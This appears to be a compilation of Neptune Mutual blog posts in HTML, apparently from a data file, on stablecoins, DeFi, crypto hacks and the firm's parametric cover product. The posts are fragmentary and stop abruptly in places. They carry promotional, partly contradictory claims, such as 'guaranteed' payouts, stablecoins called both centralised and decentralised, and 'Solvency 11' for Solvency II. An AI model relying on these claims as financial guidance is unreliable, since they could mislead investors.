on centralised assets like fiat currencies and commodities. They may be decentralised on the blockchain but the assets that they’re pegged onto are centralised.</p><p>Although there are a few stablecoins that are fully decentralised such as algorithmic stablecoins, most stablecoins used today are only somewhat decentralised. But again, unlike centralised assets, investors and owners get full ownership of their stablecoins.</p><p>Stablecoins are decentralised and function just as much as other decentralised financial assets.</p><h2 id="defi%E2%80%99s-need-for-stability">DeFi’s Need for Stability</h2><p>Use cases for stablecoins multiply together with the growth of the DeFi space.</p><p>As the crypto market continues to be in need of a stable and practical digital asset to trade with, stablecoins will continue to be in use and in development for the near future.</p><p>Possibly, it’ll make its mark as a standard asset in decentralised finance.</p><p>Dive deeper into stablecoins in our more detailed blog on the <a href="https://blog.neptunemutual.com/a-future-with-stablecoins-how-to-use-stablecoins-to-grow-in-the-crypto-market" rel="follow">current use and potential growth of stablecoins in digital finance.</a></p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

They are so-called because they are digital representations of value. These include cryptocurrencies, asset-backed stablecoins, crypto-assets, non-fungible tokens (NFTs), among others.</p><p>Ever since they hit the scene, digital assets have shown no signs of slowing down. Recent reports show the cryptocurrencies market is now worth over <a href="https://time.com/6115300/cryptocurrency-value-3-trillion/" rel="nofollow noopener noreferrer">$3 trillion</a>, while the NFTs market, which only became mainstream around 2020–2021, is now worth over <a href="https://markets.businessinsider.com/news/currencies/nft-market-41-billion-nearing-fine-art-market-size-2022-1" rel="nofollow noopener noreferrer">$41 billion</a>.</p><p>Also growing more relevant in the crypto space are DeFi (Decentralised Finance) projects and stablecoins which have soared to billions in market value in the last year alone.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.neptunemutual.com/content/images/2022/07/defi-tvl.png" class="kg-image" alt="" loading="lazy" width="1400" height="948" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/defi-tvl.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/defi-tvl.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/defi-tvl.png 1400w" sizes="(min-width: 720px) 720px"><figcaption><strong><em>Graph showing total value locked in DeFi as of October 2021 | Image source: </em></strong><a href="https://cointelegraph.com/news/defi-can-be-100-times-larger-than-today-in-5-years" rel="nofollow noopener noreferrer"><strong><em>cointelegraph.com</em></strong></a></figcaption></figure><h2 id="the-market-is-poised-for-significant-growth">The market is poised for significant growth</h2><p>Based on the numbers alone, it’s easy to see how the digital assets market is growing exponentially. Because the more an asset gains global popularity and rises in value, the more people want to get in on it. Consequently, both retail and institutional investors inject even more capital into these assets. Large corporations like Tesla and MicroStrategy have joined the bandwagon by including BTC in their balance sheets. Even countries like El Salvador are <a href="https://www.weforum.org/agenda/2021/09/el-salvador-officially-adopts-bitcoin-as-legal-tender-but-will-other-countries-follow/#:~:text=On%20September%207%2C%20El%20Salvador,larger%20countries%20in%20the%20region." rel="nofollow noopener noreferrer">adopting BTC as legal tender</a>.</p><p>Another reason for this rapid growth is that blockchain projects, by nature, are decentralised and thus have low barriers to entry. Anyone with an internet connection can log into an NFT marketplace and buy or sell NFTs. Anyone with enough stakeable cryptocurrencies, such as ADA and SOL can stake them to earn good rewards.</p><p>Lastly, digital assets have the one characteristic necessary to increase in value — scarcity. The most popular cryptocurrency, Bitcoin, has a maximum supply of only 21 million BTC. Its halving mechanism is also designed to slash the supply by 50% roughly every four years. This creates scarcity amid increasing demand. NFTs also boast this certain level of scarcity. The rarer the token, the more value it commands in the marketplace.</p><h2 id="digital-assets-are-subject-to-significant-risks">Digital assets are subject to significant risks</h2><p>Where there is value, there is also risk. In the case of digital assets, the biggest risk exposure is in the integrity of the smart contracts and dApps (decentralised applications) used to facilitate them.</p><p>Blockchains are inherently secure and tamper-proof. It will take massive amounts of computing power to take control of the network and make changes to any block. So instead, hackers turn their attention to the protocols, applications, and wallets that exist on the network.</p><p>At first, crypto exchanges were the prime targets. Who can forget the infamous <a href="https://www.wired.com/2014/03/bitcoin-exchange/" rel="nofollow noopener noreferrer">Mt. Gox hack and its $460 million </a>disaster? The most recent appears to be the <a href="https://blog.crypto.com/crypto-com-security-report-next-steps/" rel="nofollow noopener noreferrer">January 2022 Crypto.com hack</a>, which cost the Singapore-based cryptocurrency exchange app over 4,830 ETH and 440 BTC, among other assets.</p><p>In the last five years, there have been several high-profile hacks of smart contracts and DeFi protocols. All of them involved large amounts of money being lost because the culprits were able to exploit vulnerabilities in the code. An example is the $120 million theft from DeFi protocol BadgerDAO in December 2021. The attack was discovered by blockchain security company PeckShield.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.neptunemutual.com/content/images/2022/07/peckshield-badgerdao-tweet-1.png" class="kg-image" alt="" loading="lazy" width="1950" height="1990" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/peckshield-badgerdao-tweet-1.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/peckshield-badgerdao-tweet-1.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/07/peckshield-badgerdao-tweet-1.png 1600w, https://blog.neptunemutual.com/content/images/2022/07/peckshield-badgerdao-tweet-1.png 1950w" sizes="(min-width: 720px) 720px"><figcaption><strong><em>Source: </em></strong><a href="https://twitter.com/peckshield/status/1466356911842856967?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1466356911842856967%7Ctwgr%5E%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.businessinsider.in%2Finvestment%2Fnews%2Fhackers-steal-120-million-from-defi-protocol-badgerdao-platform-hits-indefinite-pause-on-all-smart-contract-activity%2Farticleshow%2F88068762.cms" rel="nofollow noopener noreferrer"><strong><em>twitter.com/peckshield</em></strong></a></figcaption></figure><h2 id="how-is-money-stolen-from-blockchain-protocols">How is money stolen from blockchain protocols?</h2><h3 id="bugs">Bugs</h3><p>Even after passing an audit, it’s still possible for a protocol to contain bugs.

In comparison, money lost to crypto exchanges was below $3 million.</p><p>Keep in mind that these are just the hacks that made the headlines. There’s no telling how many more have occurred that aren’t public knowledge yet.</p><h3 id="so-the-question-is%E2%80%A6">So, the question is…</h3><p>Can we ever be fully confident that code works as intended 100% of the time?</p><p>Probably not. Projects work hard to protect themselves, but alone, these safeguards cannot guarantee complete protection. Admittedly, there have been several cases of stolen digital assets being recovered, but this process is unbearably lengthy. In some cases, getting back what you lost depends on the benevolence of the hacker.</p><p>Perhaps it’s time to consider other security measures that we can employ to plug these gaps.</p><h3 id="on-chain-parametric-cover-for-when-codes-fail">On-chain parametric cover for when codes fail</h3><p>Together with the growing desire to own digital assets, protection for these blockchain-based digital assets will be in demand as well. Cover protocols help investors and owners protect their digital assets from swelling exploitation and crypto market risks. To understand how covers in the decentralised space work, it can be a good idea to take a look into how traditional insurance works.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/onchain-insurance.png" class="kg-image" alt="" loading="lazy" width="1400" height="788" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/onchain-insurance.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/onchain-insurance.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/onchain-insurance.png 1400w" sizes="(min-width: 720px) 720px"></figure><p>Insurance is a product designed to mitigate financial risk. You insure assets to protect them against unlikely events so that in the event that they do happen you are protected against financial loss.</p><p>For instance, people insure their homes against natural disasters. No one expects these disasters to happen, but if they do, it is responsible and reassuring to have a safety net in place to protect against the resulting damage and related expenses. Without insurance, the big consequences of low probability risks can be devastating. It is not without good reason that the insurance industry is as large as it is with universally widespread adoption across all industries.</p><p>Typically, insurers categorise and group risks so that they can accurately price those risks by analysing past data; this work is undertaken by actuaries. When policyholders suffer a loss to the asset they have insured they proceed with making an insurance claim and an insurance assessor will review the documents, policy terms, and asset to determine whether or not the insurance company should pay a claim amount to the policyholder.</p><p>Insurance funds obviously require a certain amount of capital to pay policyholders in the event of claims. Whilst there may be variations in the amount of capital on hand to pay policyholder claims, minimum levels, and other requirements are generally governed by regulators, directives, and the rule of law; for example, in Europe regulated insurers need to comply with the <a href="https://ec.europa.eu/info/business-economy-euro/banking-and-finance/insurance-and-pensions/risk-management-and-supervision-insurance-companies-solvency-2_en" rel="nofollow noopener noreferrer">Solvency 11</a> directive.</p><p>In DeFi, the peer-to-peer nature of transactions often means that activity falls outside of these types of regulations. It is also true that there are different approaches to financial protection, such as hedging, that fall outside the definition and scope of the insurance products.</p><p>Understanding the different approaches taken in protecting digital assets in the blockchain industry requires a deeper look.</p><h2 id="protecting-digital-assets">Protecting digital assets</h2><p>Financial protection of digital assets is a much-needed solution in the relatively risky world of blockchain. If there is an issue with the smart contract code that results in financial loss, no one wants to hear excuses about why there isn’t enough capital to fully cover their claim. Equally, no one wants to wait months to receive their payout, or worse still, wait months to find that their claim has been rejected on a purely discretionary basis.</p><p>These are just some of the challenges that Neptune Mutual’s cover marketplace is attempting to solve. To that end, Neptune Mutual is launching an on-chain protocol based on a <a href="https://corporatesolutions.swissre.com/insights/knowledge/what_is_parametric_insurance.html" rel="nofollow noopener noreferrer">parametric cover model</a> in which dedicated cover pools will be set up by centralised finance exchanges, DeFi projects, and metaverse projects to protect against the risks of hacks and exploits. Unlike the discretionary model that pays out based on the cost of the financial loss incurred, parametric cover pays out all policyholders in the event that an incident is validated.</p><p>Neptune Mutual has adopted a low-risk approach to the design of the protocol. In essence, this means that there are a number of underlying principles (such as stablecoin liquidity pools and a 100% minimum capital ratio) that support the guarantee that policyholders will be paid out if an incident is validated.</p><p>This type of approach provides a more effective financial cover for a number of reasons.</p><p>For one, it facilitates faster claims payout since the defined parameters in the agreement eliminate the need for back and forth among underwriters, claims assessors, loss adjusters, or centralised parties. As long as the Neptune Mutual NPM token community determines through the reporting mechanism that the parameters have been met and that an incident can be validated, the coverage is triggered and the payout is immediately released to policyholders.</p><p>Because it is decentralised there is no centralised risk, and because it is an on-chain protocol all transactions are transparent. Policyholders and liquidity providers don’t have to trust the discretion of assessors because as with many blockchain protocols the Neptune Mutual protocol is a trustless environment.</p><p>In essence, Neptune Mutual’s solution strikes a balance between providing low risk, low-priced policy fees on one hand, and good returns for risk capital providers on the other. Good returns are achieved through yield optimisation strategies of cover pool capital, however, it should be noted that to ensure there is always sufficient capital to meet the total payout liability of the pool, these yield optimisation strategies are applied exclusively to capital over and above the amount required to honour the cover pool liability.

        html: '<p>Stablecoins stand out in the DeFi space for being unlike its other more popular cryptocurrency counterparts.</p><p>They’re secure, fast, and cost-effective.</p><p>But most of all, they’re known for their ability to maintain prices amidst being in a super volatile market.</p><p>Stablecoins are somewhat digital reserve assets in which their value stays virtually unchanged, even if the crypto market goes bullish or otherwise. They normally resist change, unlike most cryptocurrencies. They serve to minimise the effects of the crypto market’s price volatility in high-volume trading.</p><p>So, how do stablecoins do it? You know, remain stable.</p><h2 id="how-do-stablecoins-remain-stable">How Do Stablecoins Remain Stable?</h2><p>Stablecoins can be classified into four primary types. Three of these maintain their values based on collateralisation backed by fiat currencies, cryptocurrencies, or tangible assets. Run on a totally different system, the other fourth type of stablecoin differs itself by maintaining its stability using automated algorithms.</p><h3 id="fiat-collateralised">Fiat Collateralised</h3><p>Our first stablecoin on the list is what we call fiat-collateralised or fiat-backed stablecoins. Fiat-collateralised stablecoin providers maintain their stablecoin prices with fiat currency reserves that back each of their stablecoins.</p><p>As long as the fiat currency on which the stablecoin bases its prices on remains stable, the fiat-backed stablecoin in turn also remains stable.</p><h3 id="a-few-examples-of-fiat-collateralised-stablecoins-include">A few examples of fiat-collateralised stablecoins include:</h3><ul><li>USD Coin</li><li>Binance USD</li><li>Paxos Standard</li></ul><h3 id="crypto-collateralised">Crypto Collateralised</h3><p>On the other hand, crypto-collateralised stablecoins peg themselves to fiat assets yet they use cryptocurrencies to help maintain their value. They use a basket of one or more cryptocurrencies and other stablecoins as reserved collateral to maintain their stable value.</p><p>Since cryptocurrencies are mostly volatile, crypto-backed stablecoins tend to be overcollateralised. Buyers will have to lock in their collateral tokens with smart contracts. When the collateral cryptocurrency or currencies drops in value far enough to disrupt stablecoin stability, users are then given the chance to provide more collateral. Otherwise, stablecoin’s circulating supply gets reduced when users redeem their stablecoins to get their original collateral back because the underlying collateral has gone down in value.</p><p>They tend to have a higher degree of decentralisation and greater liquidity than fiat-backed stablecoins.</p><p>The most notable crypto-backed stablecoin would be MakerDAO’s DAI.</p><h3 id="asset-collateralised">Asset Collateralised</h3><p>Asset-backed or commodity-backed stablecoins are just as similar to fiat and crypto-backed stablecoins. The only difference is they peg their value on tangible assets like gold and other commodities.</p><p>These stablecoins use traditionally-valuable tangible assets such as gold, silver, precious metals, and even real estate as collateral.</p><p>Usually, these stablecoins attach themselves to certain units of the collateralised assets.</p><p>Some examples of asset-collateralised stablecoins include:</p><ul><li>Pax Gold</li><li>Digix Gold</li></ul><h3 id="algorithmic-stablecoins">Algorithmic Stablecoins</h3><p>Moving on from collateralised stablecoins and onto more complex algorithmic stablecoins, this type of stablecoins makes use of algorithms via smart contracts to secure and maintain price stability.</p><p>Here, algorithms determine whether to increase or decrease the stablecoin supply to maintain the price’s stability.</p><p>In order to counter any price changes, an algorithmic stablecoin reduces the supply when its value goes below the underlying asset’s market price, sometimes fiat. This happens when users want to receive back their collateral by burning the stablecoins.</p><p>Vice versa, the stablecoin supply increases when the underlying reserve assets appreciate in value. This happens when users want to mint more stablecoins with their existing collateral that has appreciated in value</p><p>Basically, it creates an automated price balancing system that helps maintain stable value through varying the number of stablecoins in circulation.</p><p>Several examples of algorithmic stablecoins include:</p><ul><li>RAI</li><li>FEI</li><li>FRAX</li></ul><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

The crypto streaming protocol was hacked, resulting in collateral damage to a number of other projects that relied on it for contributor payments or investor escrow contracts.</p><p>Following the breach, on February 9th, another exploit hit Dego Finance, a Binance Smart Chain-based protocol, and their strategic partner, Cocos-BCX, an Ethereum-based GameFi project, draining around $14.4 million in digital assets from the liquidity pools for the projects on PancakeSwap and Uniswap respectively. As per the announcement by the Dego’s team, the hacker was able to steal the funds from the projects after the private key was compromised.</p><h3 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h3><p>The International Telecommunication Union (ITU), a United Nations institution for information and communication technology, has approved Tencent’s proposal to investigate a standard technical and security framework for NFTs. The project, termed a “technical framework for DLT-based digital collection services,” will be the first U.N. approved standards initiative for NFTs, with the first draft due by the end of 2022.</p><p>McDonald’s has filed for ten separate trademarks in preparation for a move into Metaverse. The American restaurant has applied for trademarks for its own virtual food and beverages, as well as downloadable multimedia files featuring artwork, text, audio and video files, and NFTs. It has also applied for its own intellectual property encompassing entertainment services such as real-world and virtual concerts and events, as well as running a virtual restaurant with real and virtual goods and another virtual restaurant online featuring home delivery.</p><p>Another US-based food chain Panera Bread also registered a trademark for NFTs to permit commercial transactions of virtual food and beverages, as well as computer programs to access such tokens in the metaverse. Under the brand name “Paneraverse”, the restaurant will also roll out features to build virtual restaurants and other delivery aided benefits.</p><p>Bluethumb Digital, Australia’s largest online art gallery, is entering the NFT sector. The NFT marketplace, which will stage its genesis drop in late February, will be home to some of the country’s biggest digital artists.</p><p>The interest in blockchain gaming has significantly risen since the last quarter of 2021. With all of the buzz around this industry, Zynga has announced its plans to enter NFTs and blockchain-based gaming. By the end of 2022, the online and mobile game producer intends to expand its blockchain team from 15 to up to 100 people and launch an NFT-based game.</p><p>Alfa Romeo has rolled out its plans to launch the Tonale SUV in the fourth quarter of 2023, which will combine blockchain and NFTs to track the vehicle’s history. According to Alfa Romeo, the Tonale NFT will certify the car at the time of purchase and then record its overall status throughout its lifetime, thereby boosting its residual value.</p><p>In other news, Aave, the decentralised finance lending platform, has launched the Lens Protocol ecosystem on the Polygon blockchain. The protocol is a Web3-based social network that allows users to build a fully customizable NFT profile which includes the history of all posts, reposts, comments, and other content such as music, discussion, art, photography, and video.</p><p>A large number of global sports brands are experimenting with blockchain and Web3-based technology, as well as other innovative ways to link sports clubs and fans. Legia Warsaw, one of the most successful football clubs in Poland, becomes the first European club with an official NFT agency. The collaboration between Capital Block and Legia Warsaw will benefit the football club in engaging with its supporters by creating a community and developing NFTs that portray historic and significant moments in the team’s history.</p><p>Manchester United is another addition to the list, with their plans to create a fan ecosystem based on the Tezos blockchain’s metaverse concept. The multi-year collaboration with Tezos as the official training kit and technology partner will allow the iconic club to deliver tailored experiences to supporters in the web3 world, amid growing focus from mainstream firms and brands.</p><hr><h3 id=\"about-us\">About Us</h3><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>Newly baked and barely out of the innovation oven, DeFi already takes up a huge slice of the crypto pie.</p><p>Making it important for us to understand how it fits in with the present and future of the blockchain industry.</p><p>Both new and seasoned investors set their sights on DeFi’s promise of trustless, permissionless, and decentralised finance. Yet, the growing divide between avid users and sceptics sparks a lot of debate.</p><p>Its primary goal is to remove the middleman from financial transactions and this alone is more than enough reason to look into its relevance to blockchain applications.</p><p>Let’s take a look into how DeFi can go hand in hand with other popular areas of the crypto space:</p><h2 id="defi-and-the-blockchain">DeFi and the Blockchain</h2><p>I wouldn’t call the blockchain DeFi’s father — but one could say its decentralised nature as “a chip off the old block”. DeFi is directly related to the blockchain just like everything crypto. Its decentralised, unchangeable public ledger is built on blockchain technology. Because no entity has control over blockchain, DeFi cannot be manipulated to best serve those in powerful positions.</p><p>In the future, the growth in the adoption of blockchain is likely to catalyse progress in the development of DeFi.</p><h2 id="defi-and-cryptocurrency">DeFi and Cryptocurrency</h2><p>The entire DeFi system uses cryptocurrencies to provide financial services. Many investors use services such as fund transfers, lending, trading, and derivatives, amongst many others. All of these services need tokens as a means of exchanging value. The rapid expansion of DeFi means it has a direct connection with almost every cryptocurrency out there. Particularly Ethereum, more on that later.</p><p>Think of DeFi as a system of channels through which financial value flows on the blockchain.</p><h2 id="defi-and-bitcoin">DeFi and Bitcoin</h2><p>Everyone in the crypto space knows what Bitcoin is. To recap the basics, Bitcoin is the forerunner of cryptocurrencies. It is also the one with the largest market cap. Investors use it mostly as a store of value and an asset for long-term investment strategies aka HODLing.</p><p>It’s directly related to DeFi by being one of the public blockchains it can be built upon. Many Bitcoin-based financial service applications exist within DeFi. Including decentralised exchanges or DEXs like Bisq, JellySwap, and Liquality. And projects such as Ren and MoonPay. Increases in the total trade volume on DEXs have also been attributed to the growing usage of Bitcoin on DeFi platforms.</p><p>Experts also discuss how Bitcoin’s movement in value will influence DeFi usage, given that it adds more collateral.</p><p>However, DeFi’s growth is not dependent on the value of Bitcoin. DeFi’s reach is much larger than any single cryptocurrency.</p><h2 id="defi-and-ethereum">DeFi and Ethereum</h2><p>Overtaking Bitcoin in terms of relevance in the DeFi space is altcoin king, Ethereum. Most of what we see and know of decentralised finance are built on the Ethereum network.</p><p>As the 2nd largest cryptocurrency, Ethereum gives DeFi a platform to build dApps, where decentralised transactions, lending, and trade take place.</p><p>Because of Ethereum, DeFi can use smart contracts to remove the need and costs of having a middleman. The majority of the DeFi ecosystem runs on top of the Ethereum blockchain technology. This cryptocurrency is what solidifies decentralised finance.</p><p>Maybe that’s why they call the programming language for Ethereum — Solidity.</p><h2 id="defi-and-other-altcoins">DeFi and Other Altcoins</h2><p>Besides Ethereum, DeFi works with the majority of altcoins on the blockchain as well. Altcoins are cryptocurrencies that are not Bitcoin including Ethereum. The term is a combination of the words “alternate” and “coin” being an alternative coin for Bitcoin.</p><p>They set themselves apart from BTC by upgrading their functions and filling its gaps. Popular altcoins include Ethereum, Ripple, Cardano, Litecoin, Polygon, and Solana.</p><p>Many of the altcoins developed and in development intend to be primary drivers of the DeFi system. They aim to amplify ease of use, transaction speed, collateral size, and dApp development.</p><p>In the future, we might find more altcoins in development to support the key characteristics of decentralised finance.</p><h2 id="defi-and-stablecoins">DeFi and Stablecoins</h2><p>Stablecoin is a form of cryptocurrency that pegs its value to assets such as traditional fiat, commodities, and other cryptocurrencies.</p><p>Stablecoin developers like MakerDAO, Binance, and Paxos tokenize these assets to create a collateralized system for stablecoins to be stable.</p><p>Since most cryptocurrencies are highly volatile, investors and traders opt to use stablecoins because they don’t usually fluctuate in value.</p><p>In the DeFi market, investors use stablecoins to yield rewards on their crypto assets, preferring this over traditional interest-generating investments like savings accounts, bonds, and money market accounts. They become important assets in transfers, lending, and trading.</p><p>Parametric cover protocol, Neptune Mutual, uses stablecoins when they make guaranteed payouts to cover policyholders.</p><h2 id="defi-and-dapps">DeFi and DApps</h2><p>DeFi extends to more than just cryptocurrencies. It’s also an avenue for developers to design and deploy applications on the blockchain called dApps. These are the apps coded with smart contracts that carry out the functions that make DeFi a system without intermediaries.</p><p>Earlier, we identified DeFi as a technology that’s built on the blockchain. But, to be more specific, DeFi is built on dApps that are built on the blockchain.</p><p>These two major emerging technologies in the crypto industry work together to remove the need for centralised middlemen. They give users the freedom and responsibility of having full control over their digital finances.</p><p>It’s likely that dApp development will grow together with the DeFi market, given both functions closely together.</p><h2 id="defi-and-covers">DeFi and Covers</h2><p>Even as promising as it is, DeFi is relatively new and in development. DeFi developers and criminals are in a race to discover vulnerabilities in the financial system. While the former intends to improve consumer protection and security, the latter is on the lookout to make their next hack or exploit.</p><p>DeFi protocol, Neptune Mutual, gives investors and traders access to parametric cover products. They reduce their exposure to crypto market risks with guaranteed payouts paid instantly once certain hacks and exploits get resolved. Among these are exchange hacks, DeFi protocol attacks, and smart contract breaches.</p><h2 id="defi-and-nfts">DeFi and NFTs</h2><p>Red-hot and booming, NFTs or non-fungible tokens, are starting to enter mainstream usage. Companies and communities of creators and retail investors investing in the crypto asset. NFTs are digital assets that store valuable things such as art, video game items, photos, videos, music, and other forms of media. It makes these items exclusive and unique.</p><p>NFTs and DeFi come together in terms of verifying NFT ownership. With the use of DeFi, it can be easy to prove who owns an NFT. Because of the collateralized design of decentralised finance, investors NFT owners can use them as loan collateral. These NFT-backed loans are growing in popularity and with that, innovation in the DeFi space grows as well.</p><p>Creators and owners can use NFTs to attribute value to almost any object. DeFi comes into play by being the system that unlocks the value of such objects.</p><p>Soon, we’ll see DeFi and NFTs reimagine how we think of assets and finance.</p><h2 id="defi-and-the-metaverse">DeFi and the Metaverse</h2><p>The Metaverse. Cue Aladdin’s A Whole New World. Kidding aside, the Metaverse intends to be a fully immersive virtual reality space. People can create their own digital environments within the metaverse. They can exist within it as well and connect with other users beyond simply conventional media sharing.</p><p>Since the metaverse is made up of different custom-made worlds, it is valuable to have a common way of defining virtual asset ownership so that assets can be transported and exchanged between these different worlds. Projects like MANA, SAND, and GALA are getting more and more popular not least because of the ability to earn, own, and transfer digital assets.</p><p>DeFi makes it easy to buy and sell metaverse tokens and helps with P2P transactions. It’s possible DeFi will help establish and nurture the economy or economies that’ll exist within the metaverse.</p><h2 id="why-defi-matters">Why DeFi Matters</h2><p>Looking at DeFi now, it’s not hard to imagine how practical and foundational it is to the crypto market. Including the spaces that exist within it.</p><p>Decentralised finance might become the standard for finance in the blockchain.

        html: '<p>Fast-growing. Controversial. Revolutionary.</p><p>DeFi or decentralised finance is the latest emerging tech that’s turning heads in the crypto market.</p><p>Coined in August 2018 by a bunch of Ethereum devs and entrepreneurs in a Telegram chat, the similarity between the term DeFi and ‘defy’ isn’t coincidental. It truly was built to defy conventional financial constructs.</p><p>Built predominantly on the Ethereum blockchain, DeFi re-envisions how we normally do finance by removing the need for intermediaries such as central banks and brokerages in everyday financial transactions.</p><p>DeFi sets itself apart by being unlike anything like traditional finance. As a financial system, DeFi gives you full access and responsibility over your own funds.</p><p>It redefines the extent of what cryptocurrency can do and opens the possibility of creating easier-to-use and autonomous financial institutions through dApps or decentralised applications.</p><h2 id="defying-conventional">Defying Conventional</h2><p>In essence, DeFi eliminates the need for a middleman in financial transactions.</p><p>Instead of using banks to mediate transactions between you and your counterparty — DeFi gives you the chance to transact directly with others in a system where you do not need to know or trust them, a so-called trustless environment.s.</p><p>DApps contain code that organise the terms of transactions between two or more parties and ensures the execution conforms to these terms. This greatly increases the efficiency and reduces the costs of operating these financial products, leading to smoother and quicker financial transactions.</p><p><strong>These are 5 key characteristics that qualify a financial system as DeFi:</strong></p><ul><li>No intermediaries, such as banks, exchanges, and brokers, are responsible for your funds and digital assets.</li><li>Data is recorded on the blockchain. DeFi’s open-source transparency gives everyone access to look at transaction details.</li><li>Presence of open networks that make transactions virtually limitless in terms of geography.</li><li>Ease of access to financial services.</li><li>User and community-centric dApps.</li></ul><p>So, what makes this all possible?</p><p>Enter smart contracts.</p><p>Smart contracts are code that instructs your funds to conform to the logic of the terms and conditions of the smart contract. They are programmable contracts that replace the need for human intervention that is required when executing traditional financial agreements. As long as you have a computer and Internet connection, you can take part in DeFi wherever you are in the world.</p><p>With traditional finance, getting access to financial products and services, such as loans, is often lengthy and depends upon a number of factors including credit history. With DeFi, anyone can get access to these financial services without the need for a government or financial institution to qualify them for these services.</p><p>This open-access approach to finance might lead you to think that the probability of default is higher in DeFi due to the lack of control over those participating in the financial system, however, the nature of a trustless system is that smart contracts give a more secure and reliable platform of borrowing, lending, and transacting on the DeFi system because the logic of the terms and conditions are programmed into the contract itself, and are not dependent upon the good nature of any of the parties involved.</p><p>However, like all new technologies, DeFi is not immune to risk, and problems can occur arising from user error and criminal hacks and exploits. In addition, its relative immaturity combined with its technical complexity makes it vulnerable to bugs and loopholes.</p><p>Despite the popularity and rapid growth of DeFi financial assets and transactions, there is surprisingly low adoption of products to provide protection against these risks. Parametric cover protocols like Neptune Mutual help give investors and creators access to cover products that guarantee payouts in the event of the most common types of crypto hacks &amp; exploits.</p><h2 id="use-cases-of-defi">Use Cases of DeFi</h2><p>With DeFi, users now have many ways of securing their funds and efficiently making transactions. It’s a financial system designed to give the end-user the most advantage and beneficial value.</p><p>Users are beginning to adopt and use DeFi for:</p><ul><li><strong><strong>Borrowing &amp; Lending.</strong></strong> Open, decentralised P2P lending protocols are becoming popular in the DeFi ecosystem because of their advantages in comparison to the traditional credit system. These protocols are built on public blockchains that make transactions between users secure in a trustless environment, as mentioned. From instant settlements to digital asset collateralization, DeFi users, developers, and investors are being attracted by the advantages of DeFi that have the potential to take a significant place in the world credit market.</li><li><strong><strong>Decentralised Exchanges (DEXs). </strong></strong>With DEXs, users can easily convert both cryptocurrencies and stablecoins. These exchanges are unlike centralised exchanges. Decentralised exchanges simply give users a platform to trade digital assets without the need for an intermediary to take custody of their funds. Transactions through a DEX go directly to the receiver thanks to the specific program coded into smart contracts. Because they require less maintenance and responsibility, decentralised exchanges usually have lower trading fees compared to centralised exchanges, making it easy for people to prefer transacting through them instead of the traditional exchange.</li><li><strong><strong>Stablecoins.</strong></strong> Better known as digital cash. Stablecoins peg their value to traditional fiat currencies like USD through fiat currency reserves, cryptocurrencies, or commodities. Built to counter the high volatility tendencies of the crypto market, many investors use stablecoins for storage or transactions because of their very low volatility and stability.</li><li><strong><strong>DeFi protocols.</strong></strong> Neptune Mutual is an example of a DeFi protocol. It gives users access to cover products that’ll guarantee them immediate payouts once incidents are resolved. They reward liquidity providers as well.</li></ul><h2 id="how-to-invest-in-defi">How to Invest in DeFi</h2><p>There are many ways to invest in the DeFi space. You’ll have to start acquiring cryptocurrencies frequently used in DeFi such as ETH, BNB, and MATIC. You can buy and trade these currencies through the decentralised exchanges mentioned previously.</p><p>Most investors have varying strategies when it comes to investing in DeFi.</p><ul><li><strong><strong>HODL.</strong></strong> What’s investing in the crypto market without HODLing? So far, holding on to your digital assets is the simplest long-term strategy beginner investors can start with. It’s a strategy that’s based on the expectation that owned crypto assets’ value will grow over time. Even experienced retail investors and large institutions HODL through the market cycles.</li><li><strong><strong>Borrowing and Lending.</strong></strong> Borrowing and lending in crypto are becoming a staple of the blockchain ecosystem. DeFi systems are starting to pop up in which lenders can supply tokens into liquidity pools. Borrowers pay interest on their loans which in turn gives lenders interest income.</li><li><strong><strong>Staking.</strong></strong> This involves committing idle digital assets to the market to provide liquidity and security. People stake their crypto assets to get rewards in governance tokens that are usually used for trading or voting on the staking project.</li><li><strong><strong>Yield Farming. </strong></strong>Moving on from simple investment strategies, yield farming incorporates all borrowing, lending, and staking to yield rewards. Users take out loans and exchange the loaned-out asset for high-performance projects. With tokens from such projects, users can give collateral for another token and stake their borrowed assets.</li></ul><h2 id="should-i-invest-in-defi">Should I invest in DeFi?</h2><p>Remember, new emerging technologies and markets like DeFi are inherently risky. Especially without a centralised entity responsible for all financial processes and transactions of the DeFi space, you are entirely responsible for your DeFi funds and investments.</p><p>It’s important that you do your own research before you invest. Qualify every new and promising project, protocol, and token you come across. Criminals tend to take advantage of both human and technological vulnerabilities to exploit and hack investors’ funds.</p><p>Always assess the potential vulnerabilities of your digital assets. Stay vigilant against exploits on social media and email, just to name a few, that’ll take advantage of your desires to make it big in crypto. Protect your assets and funds accordingly with parametric cover products available on Neptune Mutual.</p><h2 id="final-thoughts">Final Thoughts</h2><p>Decentralised finance is disrupting finance at a global scale. By introducing more secure, efficient, and effective ways of conducting everyday financial transactions, DeFi is growing fast and is likely to become a significant part of the financial market. Is it just an alternative to traditional finance or will it become the new standard for finance? <a href="https://blog.neptunemutual.com/how-will-defi-change-the-financial-game-in-the-long-run" rel="follow">How will DeFi change the finance in the long run?</a></p><p>Many think DeFi is a revolutionary movement against traditional finance. Some think it’s an elaborate scam. There are also those who only see DeFi as a chance to hop in on the next big thing. Whatever you may think of DeFi and its growing popularity, its ability to grab attention is making it difficult to ignore.</p><p>Like everything else, DeFi comes with its own risks as well. Anyone who dives into the crypto space should always ask themselves how they can mitigate and manage their risks, especially in a high-risk volatile market. Neptune Mutual’s parametric cover protocol gives crypto investors, traders, and owners access to reliable cover pools that help them reduce and mitigate risks in the crypto market, protecting their digital assets.</p><p>The fact still remains: DeFi is an emerging technology that is 